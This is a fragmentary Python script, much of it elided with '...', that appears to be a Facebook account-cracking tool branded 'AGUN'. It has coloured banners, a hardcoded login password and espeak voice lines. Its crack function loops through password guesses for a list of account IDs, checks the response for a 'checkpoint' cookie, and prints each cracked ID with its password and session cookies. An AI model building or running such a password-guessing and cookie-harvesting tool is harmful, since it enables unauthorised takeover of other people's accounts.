...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mAGUN')
...
while attemps < 12345677901:
    ...
    if username == 'user' and password == 'AGUN12':
...
os.system('espeak -a 300 " Welcome,   to,  my,  Tools,  I, am, AGUN"')
...
\33[1;96m╔═════════════════════════════════════════╗
\033[93m ║ AUTHOR > \x1b[1;91mMD AGUN
\033[32m ║ FB > \x1b[1;97mAGUN
\033[95m ║ GITHUB > \x1b[0;34mAGUN-12
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[AGUN-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#AGUN-
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•AGUN-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m══════════════════════════════════════════════╗')
				os.system('espeak -a 300 " AGUN ,  Ok,  id"')
